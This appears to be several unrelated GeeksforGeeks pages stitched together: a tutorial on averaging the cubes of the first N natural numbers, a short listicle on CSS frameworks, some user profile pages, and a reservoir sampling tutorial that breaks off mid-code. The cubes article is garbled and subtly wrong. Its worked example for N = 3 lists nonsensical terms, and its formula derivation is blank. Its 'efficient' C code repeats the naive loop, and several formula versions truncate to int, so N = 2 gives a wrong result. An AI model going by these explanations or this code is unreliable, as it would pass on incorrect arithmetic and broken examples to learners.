Average of Cubes of first N natural numbers - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Coding-DecodingGeometry and Co-ordinatesAverageAverage of Cubes of first N natural numbersExpected number of coin flips to get two heads in a row?Expected Number of Trials to get N Consecutive HeadsPuzzle | Dividing a Square into N smaller squaresPuzzle | Can a Knight reach bottom from top by visiting all squaresPuzzle | Minimum time required to make N PancakesCheck if its possible to make sum of the array odd with given OperationsMinimum number of moves required to solve a Jigsaw Assembly PuzzlePuzzle: Transferring the touristsDividing the rectangle into n right-angled trianglesPuzzle | Snail and WallMinimum number of cuts required to pay salary from N length Gold BarEggs dropping puzzle | Set 2Eggs dropping puzzle (Binomial Coefficient and Binary Search Solution)Egg Dropping Puzzle | DP-11Longest Palindromic Subsequence | DP-12Longest Palindromic Substring | Set 1Longest Palindromic Substring | Set 2American Express (On-Campus Internship, Full Time Offer)Aptitude | Puzzles | Question 1TCS DIGITAL PUZZLE | Lateral ThinkingAptitude | Arithmetic Aptitude 4 | Question 2Aptitude | Wipro Mock Test | Question 1Barclays Interview Experience | On Campus for InternshipProgram to find the last two digits of x^y Average of Cubes of first N natural numbers Last Updated: 03-07-2020 Given a positive integer N, the task is to find the average of cubes of first N natural numbers. Examples: Input: N = 2 Output: 4.5 Explanation: For integer N = 2, We hvae ( 13 + 23 ) = 1 + 8 = 9 average = 9 / 2 that is 4.5Input: N = 3 Output: 12 Explanation: For N = 3, We have ( 13 + 23 + 23 + 23 + 33 + 23 ) = 27 + 8 + 1 = 36 average = 36 / 3 that is 12 Recommended: Please try your approach on {IDE} first, before moving on to the solution. Naive Approach: The naive approach is to find the sum of cubes of first N natural numbers and divide it by N.Below is the implementation of above approach: C filter_none edit close play_arrow link brightness_4 code // C program for the above approach #include <stdio.h> // Function to find average of cubes double findAverageOfCube(int n) { // Store sum of cubes of // numbers in the sum double sum = 0; // Calculate sum of cubes int i; for (i = 1; i <= n; i++) { sum += i * i * i; } // Return average return sum / n; } // Driver Code int main() { // Given number int n = 3; // Function Call printf("%lf", findAverageOfCube(n)); return 0; } chevron_right filter_none C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Function to find average of cubes double findAverageOfCube(int n) { // Storing sum of cubes // of numbers in sum double sum = 0; // Calculate sum of cubes for (int i = 1; i <= n; i++) { sum += i * i * i; } // Return average return sum / n; } // Driver Code int main() { // Given Number int n = 3; // Function Call cout << findAverageOfCube(n); } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for the above approach import java.util.*; import java.io.*; class GFG{ // Function to find average of cubes static double findAverageOfCube(int n) { // Storing sum of cubes // of numbers in sum double sum = 0; // Calculate sum of cubes for (int i = 1; i <= n; i++) { sum += i * i * i; } // Return average return sum / n; } // Driver Code public static void main(String[] args) { // Given Number int n = 3; // Function Call System.out.print(findAverageOfCube(n)); } } // This code is contributed by shivanisinghss2110 chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python3 program for the above approach # Function to find average of cubes def findAverageOfCube(n): # Storing sum of cubes # of numbers in sum sum = 0 # Calculate sum of cubes for i in range(1, n + 1): sum += i * i * i # Return average return round(sum / n, 6) # Driver Code if __name__ == '__main__': # Given Number n = 3 # Function Call print(findAverageOfCube(n)) # This code is contributed by mohit kumar 29 chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for the above approach using System; class GFG{ // Function to find average of cubes static double findAverageOfCube(int n) { // Storing sum of cubes // of numbers in sum double sum = 0; // Calculate sum of cubes for (int i = 1; i <= n; i++) { sum += i * i * i; } // Return average return sum / n; } // Driver Code public static void Main() { // Given Number int n = 3; // Function Call Console.Write(findAverageOfCube(n)); } } // This code is contributed by Nidhi_biet chevron_right filter_none Output: 12.000000 Time complexity: O(N) Efficient Approach: We know that, Sum of cubes of first N Natural Numbers = Average is given by: => => => => Therefore, the average of the cube sum of first N natural numbers is given by Below is the implementation of above approach: C filter_none edit close play_arrow link brightness_4 code // C program for the above approach #include <stdio.h> // Function to find average of cubes double findAverageOfCube(int n) { // Store sum of cubes of // numbers in the sum double sum = 0; // Calculate sum of cubes int i; for (i = 1; i <= n; i++) { sum += i * i * i; } // Return average return sum / n; } // Driver Code int main() { // Given number int n = 3; // Function Call printf("%lf", findAverageOfCube(n)); return 0; } chevron_right filter_none C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // function to find an average of cubes double findAverageofCube(double n) { // Apply the formula n(n+1)^2/4 int ans = (n * (n + 1) * (n + 1)) / 4; return ans; } // Driver Code int main() { // Given Number int n = 3; // Function Call cout << findAverageofCube(n); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for the above approach class GFG{ // function to find an average of cubes static double findAverageofCube(double n) { // Apply the formula n(n+1)^2/4 int ans = (int)((n * (n + 1) * (n + 1)) / 4); return ans; } // Driver Code public static void main(String[] args) { // Given Number int n = 3; // Function Call System.out.print(findAverageofCube(n)); } } // This code is contributed by shivanisinghss2110 chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python3 program for the above approach # Function to find average of cubes def findAverageOfCube (n): # Apply the formula n*(n+1)^2/4 ans = (n * (n + 1) * (n + 1)) / 4 return ans # Driver code if __name__ == '__main__': # Given number n = 3 # Function call print(findAverageOfCube(n)) # This code is contributed by himanshu77 chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for the above approach using System; class GFG{ // function to find an average of cubes static double findAverageofCube(double n) { // Apply the formula n(n+1)^2/4 int ans = (int)((n * (n + 1) * (n + 1)) / 4); return ans; } // Driver Code public static void Main() { // Given Number int n = 3; // Function Call Console.Write(findAverageofCube(n)); } } // This code is contributed by Code_Mech chevron_right filter_none Output: 12.000000 Time Complexity: O(1) My Personal Notes arrow_drop_up Save Recommended Posts:Sum of cubes of first n odd natural numbersDifference between Sum of Cubes and Sum of First N Natural NumbersSum of alternating sign cubes of first N Natural numbersMinimum value of K such that sum of cubes of first K natural number is greater than equal to NFind the average of first N natural numbersAverage of first n even natural numbersSum of cubes of even and odd natural numbersAverage of Squares of Natural NumbersSum of cubes of first n even numbersJava Program to Display Numbers and Sum of First N Natural NumbersAverage of first n odd naturals numbersNumbers less than N that are perfect cubes and the sum of their digits reduced to a single digit is 1Number of perfect cubes between two given numbersPrint squares of first n natural numbers without using *, / and -Print all increasing sequences of length k from first n natural numbersFind m-th summation of first n natural numbers.Program to find sum of first n natural numbersProgram for cube sum of first n natural numbersC Program for cube sum of first n natural numbersC++ Program for cube sum of first n natural numberscoder_nerocoderIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : mohit kumar 29, shivanisinghss2110, nidhi_biet, Code_Mech, himanshu77 Article Tags : AptitudeArticlesCC ProgramsC++C++ ProgramsCompetitive ProgrammingJavaMathematicalPuzzlesPythonmaths-cubeNatural Numbers Practice Tags : MathematicalJavaPuzzlesCCPP thumb_up 8 To-do Done 1.3 Based on 3 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Temperature Converter using Tkinter Next last_page Reorder an array such that sum of left half is not equal to sum of right half Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Aptitude Aptitude | Wipro Mock Test | Question 2Aptitude | GATE CS 1998 | Question 49Aptitude | Wipro Mock Test | Question 3Aptitude | Wipro Mock Test | Question 4Aptitude | Wipro Mock Test | Question 37 Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

6 Best CSS frameworks You should Know to design Attractive Websites - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ How to make div not larger than its contents using CSS?Building Tooltip using CSSSet the opacity only to background color not on the text in CSSTransition shorthand with multiple properties in CSS?How to prevent line breaks in the list of items using CSS?How to remove the space between inline-block elements?6 Best CSS frameworks You should Know to design Attractive WebsitesSpace between two rows in a table using CSS?What is the difference between display: inline and display: inline-block in CSS?How to write a:hover in inline CSS?How to place two div side-by-side of the same height using CSS?What is a clearfix?Making a div vertically scrollable using CSSHow to give a div tag 100% height of the browser window using CSSWildcard Selectors (*, ^ and $) in CSS for classesHow to style a dropdown using CSS?Remove border from IFrame using CSSHide scroll bar, but while still being able to scroll using CSSHow to float three div side by side using CSS?How to change color of PNG image using CSS?What is the best way to include CSS file? Why use @import?How to style icon color, size, and shadow by using CSS ?How to set multiple background images using CSS?CSS Preprocessor | SASSCSS | Website Layout 6 Best CSS frameworks You should Know to design Attractive Websites Last Updated: 04-12-2018 If you want to speed up your website and development process, or want to add some classy designs to your website, then you’re at the right place. Awesome new popups, speed, ultimate colors and themes are waiting for you. Front end development is the complete pack of creation and colors and have amazing frameworks. Every framework has its own unique utility.So here are some frameworks used by top companies you should know. So, let’s start with the most used one. Twitter Bootstrap: Bootstrap is the most used frontend framework. May be you’re reading this article on phone, tablet or may be on laptop. Think how irritating it will be if you’ve to rotate your mobile or scroll here and there. To see complete interface or to read something. So, here the bootstrap helps to design websites or web apps responsibly. With three different classes for mobile, pads and laptops, all the content of web page gets adjusted according to the screen size of the device on which you open it. Semantic UI: Famous for its simple and elegant designs, and unbelievable theme effects. Semantic UI offers 3000+ theme variable, 50+ UI and 5000+ commits. It helps to create beautiful, responsive layouts using HTML. One more interesting thing about it is– you have to develop your UI once. And then you can deploy with the same code everywhere. Semantic comes equipped with an intuitive inheritance system. High level theming variables that let you have complete design freedom. Small file sizes and minimal load times. Because you can load only the components that you need; each has its own JS file and style sheet. Foundation: Highly advance responsive frontend framework created by Zurb. Foundation is semantic, readable, flexible, and completely customizable framework. Design to work with any device, medium, and accessibility. Its rich features are also used on sites like Facebook, eBay, and Mozilla. You will have greater flexibility while working with foundation. Gumby: Gumby allows to customize and build designs much faster as it wasn’t before. Gumby Framework is a flexible, responsive CSS Framework, Powered by SASS. The Framework comes with 12 grid layout system, that divides the browser’s space into 12 grids and. Gumby supports nested gridding and create rapid and logical page layout. And app prototypes with a flexible and responsive grid system and UI kit. Gumby Framework is available with feature-rich documentation. Materialize: A modern responsive frontend framework based on Material Design. Works with refined animations and transitions to provide a smoother experience for developers. User experience focused offers huge selection of components. UIKit: UIKit is Lightweight, highly customizable and modular frontend framework. Helps to create advanced user interfaces using components like nestables. UIkit is comprehensive collection of HTML, CSS, and JS-based small, responsive components. This framework uses consistent and conflict-free naming conventions. This makes it simple to use, easy to customize, and scale. Conclusion: There are countless other frameworks around the web. Every frameworks is giving its best. Each one has its own different reason for its demand among developers. However, the above ones are the top ones and the most in-demand ones. If you’re a frontend developer or plan to become one in the future, make sure that you know these. My Personal Notes arrow_drop_up Save Recommended Posts:13 Things You Should Know Before You Enter In Web Development10 Web Development and Web Design Facts That You Should Know10 Things You Should Know As a Web DeveloperTop 5 HTML Tricks That You Should Know10 Mac OS Keyboard Shortcuts That You Should KnowTop 10 Cybersecurity Tools That You Should Know8 Best Android Libraries That Every Android Developer Should KnowTop 5 Skills You Must Know Before You Learn ReactJSProgramming For Beginners: 10 Best HTML Coding Practices You Must Know10 Best CSS Frameworks For Frontend Developers in 2020Which language should you learn first if you want to make an app?Top 3 Best Packages Of Node.js tat you should try being a Node.js Developer7 Progressive Web App Development Frameworks to Know in 202110 CSS Selectors Every Developer Should KnowStuck in Programming: Get The Solution From These 10 Best Websites7 Best Coding Challenge Websites in 2020UI vs UX Design : Which Career Option Should You Choose?7 Best Testing Frameworks for Java DevelopersThings one should know before choosing Computer Science as their majorTop 10 Algorithms every Machine Learning Engineer should knowpalaksinghla123Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArticlesCSSGBlogWeb TechnologiesCSS-Misc thumb_up 5 To-do Done 2 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page HTML | DOM console.table() Method Next last_page HTML | DOM appendChild() Method Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview Most visited in CSS How to Create Time-Table schedule using HTML ?Top 10 Projects For Beginners To Practice HTML and CSS SkillsHow to insert spaces/tabs in text using HTML/CSS?How to update Node.js and NPM to next version ?Resize image proportionally with CSS room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

princiraj1992 GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × princiraj1992 personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Shikha Singh Institution Motilal Nehru National Institute of Technology, Allahabad (MNNIT-A) 2018 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

Akanksha_Rai GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × Akanksha_Rai personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Akanksha Rai Institution Dr APJ Abdul Kalam Technical University (APJAKTU) Lucknow room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

AnkurChattopadhyay GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × AnkurChattopadhyay personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Ankur Chattopadhyay Institution Government College of Engineering & Textile Technology Berhampore 2018 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

GauriShankarBadola GeeksforGeeks Profile share Explore Courses keyboard_arrow_down Get hired Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Get Hired Sign In search close × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password × GauriShankarBadola personBasic codePractice chrome_reader_modeArticles assignment_turned_inTestimonial schoolInstitutions location_cityOrganizations how_to_regCampus Ambassadors local_post_officeInvite Name Gauri Shankar Badola Organization Siemens 2018 2019 2020 January February March April May June July August September October November December GO! room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Interview Experience Internships Videos @geeksforgeeks, Some rights reserved

Reservoir Sampling - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Shuffle a deck of cardsShuffle a given array using Fisher–Yates shuffle AlgorithmReservoir SamplingSelect a random number from stream, with O(1) spaceFind the largest multiple of 2, 3 and 5Find the largest multiple of 3 | Set 1 (Using Queue)Find the first circular tour that visits all petrol pumpsFinding sum of digits of a number until sum becomes single digitProgram for Sum of the digits of a given numberCompute sum of digits in all numbers from 1 to nCount possible ways to construct buildingsMaximum profit by buying and selling a share at most twiceMaximum profit by buying and selling a share at most k timesStock Buy Sell to Maximize ProfitMaximum difference between two elements such that larger element appears after the smaller numberGiven an array arr[], find the maximum j – i such that arr[j] > arr[i]Sliding Window Maximum (Maximum of all subarrays of size k)Sliding Window Maximum (Maximum of all subarrays of size k) using stack in O(n) timeNext Greater ElementNext greater element in same order as inputNext Greater Frequency ElementNumber of NGEs to the rightMaximum product of indexes of next greater on left and rightThe Celebrity ProblemExpression EvaluationMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interview Reservoir Sampling Last Updated: 02-07-2019 Reservoir sampling is a family of randomized algorithms for randomly choosing k samples from a list of n items, where n is either a very large or unknown number. Typically n is large enough that the list doesn’t fit into main memory. For example, a list of search queries in Google and Facebook. So we are given a big array (or stream) of numbers (to simplify), and we need to write an efficient function to randomly select k numbers where 1 <= k <= n. Let the input array be stream[]. A simple solution is to create an array reservoir[] of maximum size k. One by one randomly select an item from stream[0..n-1]. If the selected item is not previously selected, then put it in reservoir[]. To check if an item is previously selected or not, we need to search the item in reservoir[]. The time complexity of this algorithm will be O(k^2). This can be costly if k is big. Also, this is not efficient if the input is in the form of a stream. It can be solved in O(n) time. The solution also suits well for input in the form of stream. The idea is similar to this post. Following are the steps. 1) Create an array reservoir[0..k-1] and copy first k items of stream[] to it. 2) Now one by one consider all items from (k+1)th item to nth item. …a) Generate a random number from 0 to i where i is index of current item in stream[]. Let the generated random number is j. …b) If j is in range 0 to k-1, replace reservoir[j] with arr[i] Following is implementation of the above algorithm. C++ filter_none edit close play_arrow link brightness_4 code // An efficient program to randomly select // k items from a stream of items #include <bits/stdc++.h> #include <time.h> using namespace std; // A utility function to print an array void printArray(int stream[], int n) { for (int i = 0; i < n; i++) cout << stream[i] << " "; cout << endl; } // A function to randomly select // k items from stream[0..n-1]. void selectKItems(int stream[], int n, int k) { int i; // index for elements in stream[] // reservoir[] is the output array. Initialize // it with first k elements from stream[] int reservoir[k]; for (i = 0; i < k; i++) reservoir[i] = stream[i]; // Use a different seed value so that we don't get // same result each time we run this program srand(time(NULL)); // Iterate from the (k+1)th element to nth element for (; i < n; i++) { // Pick a random index from 0 to i. int j = rand() % (i + 1); // If the randomly picked index is smaller than k, // then replace the element present at the index // with new element from stream if (j < k) reservoir[j] = stream[i]; } cout << "Following are k randomly selected items \n"; printArray(reservoir, k); } // Driver Code int main() { int stream[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}; int n = sizeof(stream)/sizeof(stream[0]); int k = 5; selectKItems(stream, n, k); return 0; } // This is code is contributed by rathbhupendra chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // An efficient program to randomly select k items from a stream of items #include <stdio.h> #include <stdlib.h> #include <time.h> // A utility function to print an array void printArray(int stream[], int n) { for (int i = 0; i < n; i++) printf("%d ", stream[i]); printf("\n"); } // A function to randomly select k items from stream[0..n-1]. void selectKItems(int stream[], int n, int k) { int i; // index for elements in stream[] // reservoir[] is the output array. Initialize it with // first k elements from stream[] int reservoir[k]; for (i = 0; i < k; i++) reservoir[i] = stream[i]; // Use a different seed value so that we don't get // same result each time we run this program srand(time(NULL)); // Iterate from the (k+1)th element to nth element for (; i < n; i++) { // Pick a random index from 0 to i. int j = rand() % (i+1); // If the randomly picked index is smaller than k, then replace // the element present at the index with new element from stream if (j < k) reservoir[j] = stream[i]; } printf("Following are k randomly selected items \n"); printArray(reservoir, k); } // Driver program to test above function. int main() { int stream[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}; int n = sizeof(stream)/sizeof(stream[0]); int k = 5; selectKItems(stream, n, k); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // An efficient Java program to randomly // select k items from a stream of items import java.util.Arrays; import java.util.Random; public class ReservoirSampling { // A function to randomly select k items from stream[0..n-1]. static void selectKItems(int stream[], int n, int k) { int i; // index for elements in stream[] // reservoir[] is the output array. Initialize it with // first k elements from stream[] int reservoir[] = new int[k]; for (i = 0; i < k; i++) reservoir[i] = stream[i]; Random r = new Random(); // Iterate from the (k+1)th element to nth element for (; i < n; i++) { // Pick a random index from 0 to i. int j = r.nextInt(i + 1); // If the randomly picked index is smaller than k, // then replace the element present at the index // with new element from stream if(j < k) reservoir[j] = stream[i]; } System.out.println("Following are k randomly selected items"); System.out.println(Arrays.toString(reservoir)); } //Driver Program to test above method public static void main(String[] args) { int stream[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}; int n = stream.length; int k = 5; selectKItems(stream, n, k); } } //This code is contributed by Sumit Ghosh chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # An efficient Python3 program # to randomly select k items # from a stream of items import random # A utility function # to print an array def printArray(stream,n): for i in range(n): print(stream[i],end=" "); print(); # A function to randomly select # k items from stream[0..n-1]. def selectKItems(stream, n, k): i=0; # index for elements # in stream[] # reservoir[] is the output # array. Initialize it with # first k elements from stream[] reservoir = [0]*k; for i in range(k): reservoir[i] = stream[i]; # Iterate from the (k+1)th # element to nth element while(i < n): # Pick a random index # from 0 to i. j = random.randrange(i+1); # If the randomly picked # index is smaller than k, # then replace the element # present at the index # with new element from stream if(j < k): reservoir[j] = stream[i]; i+=1; print("Following are k randomly selected items"); printArray(reservoir, k); # Driver Code if __name__ == "__main__": stream = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]; n = len(stream); k = 5; selectKItems(stream, n, k); # This code is contributed by mits chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // An efficient C# program to randomly // 